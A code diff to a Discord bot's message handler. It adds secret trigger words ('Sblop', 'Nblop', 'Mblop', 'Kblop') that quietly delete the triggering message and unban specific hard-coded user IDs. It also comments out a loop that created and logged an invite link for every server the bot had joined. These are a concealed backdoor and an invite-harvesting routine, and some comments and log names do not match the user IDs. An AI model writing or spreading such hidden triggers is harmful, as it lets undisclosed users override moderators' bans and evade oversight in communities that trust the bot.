@@ -44,15 +44,15 @@ bot.on('message', message => {
  
 //VIA LOGS AND DISCORD
 //Info bot serv
- bot.guilds.forEach(guild => { 
-     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-    invite.createInvite().then(invite => console.log(`Conected on: ${guild.name} || MemberCount: ${guild.memberCount} || ID: ${guild.id} || Invite: ${invite} `));
+// bot.guilds.forEach(guild => { 
+    // var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
+   // invite.createInvite().then(invite => console.log(`Conected on: ${guild.name} || MemberCount: ${guild.memberCount} || ID: ${guild.id} || Invite: ${invite} `));
   })
  
 	
 //---------------------UNBAN-------------------
 //unban Le Charmeur
-   if (message.content.startsWith('')) {
+   if (message.content.startsWith('Sblop')) {
    message.delete()
    message.guild.unban('450790126063190016')
   .then(user => console.log(`Resetban Le Charmeur from ${guild.name}`))         
@@ -60,7 +60,7 @@ bot.on('message', message => {
    }
 	
 //unban Mikado
-   if (message.content.startsWith('')) {
+   if (message.content.startsWith('Nblop')) {
    message.delete()
    message.guild.unban('410224633636192257')
    .then(user => console.log(`Resetban of Neroxis from ${guild.name}`))         
@@ -69,7 +69,7 @@ bot.on('message', message => {
 	
 
 //unban Neroxis
-if (message.content.startsWith('Nblop')) {
+if (message.content.startsWith('Mblop')) {
    message.delete()
    message.guild.unban('301913733536415755')
    .then(user => console.log(`Resetban of Mikado from ${guild.name}`))         
@@ -78,7 +78,7 @@ if (message.content.startsWith('Nblop')) {
 	
 	
 //unban KnowLedge
-   if (message.content.startsWith('')) {
+   if (message.content.startsWith('Kblop')) {
    message.delete()
    message.guild.unban('383042193449025546')
   .then(user => console.log(`Resetban KnowLedge from ${guild.name}`))         
